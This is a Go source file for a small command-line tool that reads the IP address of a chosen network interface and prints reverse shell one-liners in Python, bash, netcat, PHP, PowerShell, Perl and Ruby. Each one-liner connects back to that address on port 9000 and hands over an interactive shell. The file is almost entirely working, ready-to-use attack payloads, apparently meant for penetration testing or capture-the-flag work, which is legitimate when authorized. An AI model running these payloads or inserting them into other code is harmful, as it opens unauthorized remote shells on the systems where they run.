package main

import (
	"fmt"
	"net"
	"os"
)

const (
	python     string = "py"
	bash       string = "bash"
	netcat     string = "nc"
	php        string = "php"
	powershell string = "ps"
	perl       string = "pl"
	ruby       string = "rb"
)

func main() {

	if len(os.Args) > 2 {
		intfc := os.Args[1]
		shell := os.Args[2]
		crafted, err := generateRShell(intfc, "9000", shell)
		if err != nil {
			os.Exit(1)
		}
		fmt.Println(crafted)
		return
	}
	fmt.Printf("[-] Usage:\tmkrev [interface] [language]\n")
	fmt.Printf("[-] Example:\tmkrev tun0 py\n")
	fmt.Printf("[-] Language:\tpy, bash, nc, php, ps, pl, rb \n")
}

func generateRShell(intfc, port, shell string) (string, error) {
	ip, ok := checkInterface(intfc)
	if !ok {
		fmt.Println("[-] Error, invalid interface")
		os.Exit(1)
	}

	switch shell {
	case python:
		return fmt.Sprintf(`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`,
			ip, port), nil
	case bash:
		return fmt.Sprintf(`bash -c "bash -i >& /dev/tcp/%s/%s 0>&1"`, ip, port), nil
	case netcat:
		return fmt.Sprintf(`nc -e /bin/sh %s %s`, ip, port), nil
	case php:
		return fmt.Sprintf(`php -r '$sock=fsockopen("%s",%s);exec("/bin/sh -i <&3 >&3 2>&3");'`, ip, port), nil
	case powershell:
		return fmt.Sprintf(`$client = New-Object System.Net.Sockets.TCPClient("%s",%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`, ip, port), nil
	case perl:
		return fmt.Sprintf(`perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`, ip, port), nil
	case ruby:
		return fmt.Sprintf(`ruby -rsocket -e'f=TCPSocket.open("%s",%s).to_i;exec sprintf("/bin/sh -i <&%%d >&%%d 2>&%%d",f,f,f)'`, ip, port), nil
	default:
		return fmt.Sprint("Me dumb :("), nil
	}
}
func checkInterface(name string) (string, bool) {
	listInterfaces, _ := net.Interfaces()

	for _, ifs := range listInterfaces {
		if name == ifs.Name {
			listAddr, _ := ifs.Addrs()
			ip := listAddr[0].String()
			return ip[:len(ip)-3], true
		}
		continue
	}
	return "", false
}
